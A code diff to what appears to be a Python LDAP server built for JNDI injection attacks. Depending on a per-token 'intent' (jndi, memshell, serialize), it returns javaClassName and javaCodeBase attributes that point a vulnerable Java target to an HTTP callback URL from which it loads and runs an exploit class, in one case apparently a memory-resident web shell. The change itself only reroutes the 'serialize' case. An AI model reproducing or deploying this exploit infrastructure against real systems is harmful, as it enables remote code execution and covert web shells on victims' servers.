@@ -184,7 +184,9 @@ class LdapProtocol(asyncio.Protocol):
         intent = (row.intent if row else "record")
         spec = (row.payload_spec if row else {}) or {}
         class_name = spec.get("class_name") or f"Exp{token[:6]}"
-        if row and intent in ("jndi", "memshell", "serialize"):
+        if row and intent == "serialize":
+            intent = "jndi_serialize"
+        if row and intent in ("jndi", "memshell"):
             attrs = [
                 ("javaClassName", [class_name]),
                 ("javaCodeBase", [f"{self._settings.http_base}/callback/http/{token}/class/"]),
